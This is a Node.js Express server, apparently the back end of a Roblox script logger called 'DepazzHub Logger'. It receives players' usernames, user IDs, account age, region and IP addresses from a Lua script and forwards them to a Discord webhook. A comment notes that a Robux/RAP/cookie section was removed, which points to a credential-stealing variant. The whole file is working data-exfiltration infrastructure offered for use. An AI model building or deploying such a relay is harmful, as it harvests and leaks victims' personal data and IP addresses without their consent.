const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/1234567890/yourwebhookurl";

app.post('/log', async (req, res) => {
    try {
        // Recibimos los datos que envía el script de Lua
        const { username, displayName, userId, gameId, accountAge, region, ip } = req.body;

        const clientIP = ip || req.ip || req.connection.remoteAddress || 'N/A';

        // Construimos el embed de Discord SIN la parte de Robux/RAP/Cookie
        const payload = {
            content: "🚀 **DepazzHub Logger**",
            embeds: [{
                color: 3887359,
                fields: [
                    { name: "👤 Username", value: username || "Unknown", inline: true },
                    { name: "🏷️ Display Name", value: displayName || "N/A", inline: true },
                    { name: "🌐 IP Address", value: `\`${clientIP}\``, inline: true },
                    { name: "🎂 Account Age", value: accountAge || "N/A", inline: true },
                    { name: "🌍 Region", value: region ? region.toUpperCase() : "N/A", inline: true },
                    { name: "🆔 User ID", value: String(userId || "N/A"), inline: true },
                    { name: "🌐 Game ID", value: String(gameId || "N/A"), inline: false }
                ],
                footer: { text: "DepazzHub Logger" },
                timestamp: new Date().toISOString()
            }]
        };

        await axios.post(DISCORD_WEBHOOK, payload);
        res.status(200).json({ success: true });
    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

app.listen(port, () => {
    console.log(`Servidor corriendo en puerto ${port}`);
});
